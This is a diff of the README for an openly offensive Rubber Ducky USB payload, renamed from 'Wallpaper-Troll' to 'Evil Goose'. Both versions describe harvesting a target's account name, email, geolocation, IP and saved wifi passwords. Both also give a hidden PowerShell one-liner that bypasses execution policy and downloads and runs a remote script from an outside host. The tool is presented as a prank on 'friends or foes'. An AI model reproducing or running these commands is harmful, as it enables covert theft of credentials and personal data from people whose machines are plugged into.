@@ -13,15 +13,20 @@
   </ol>
 </details>
 
-# Wallpaper-Troll
+# Evil Goose
 
-A script I put together to torment Call Center Scammers but can be used on your friends as well...or foes.
+A payload that hires a goose to hack your target in real time
 
 ## Description
 
-This program enumerates a target PC to get their Name, GeoLocation (Latitude and Longitude), Public IP, Day password was last set, and wifi passwords. This information will be saved to a file that is then converted to a .BMP image. That image will be saved to their desktop and saved as their wallpaper. Opening the image on their desktop with NotePad will reveal the binary code with a hidden message at the bottom of the file.
+With this payload after is is executed it will wait for a mouse movement to begin 
 
-![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/RubberDucky/Payloads/RD-Wallpaper-Troll/wp-troll.jpg)
+Afterwards it will walk around your targets screen pulling out personal information about them such as: 
+
+* Full name associated with their microsoft account 
+* Email associated with their microsoft account 
+* Their exact Geo Location 
+* The wifi networks and passwords
 
 ## Getting Started
 
@@ -34,10 +39,16 @@ This program enumerates a target PC to get their Name, GeoLocation (Latitude and
 ### Executing program
 
 * Plug in your device
-* Invoke-RestMethod will be entered in the Run Box to download and execute the script from memory
+* 10 seconds later your goose is owning their system
+
 ```
-powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
+powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
 ```
+### Exiting the Payload
+
+This payload will automatically end after 2 min 
+
+Or if you press `Left Control` + `Right Control` at the same time
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
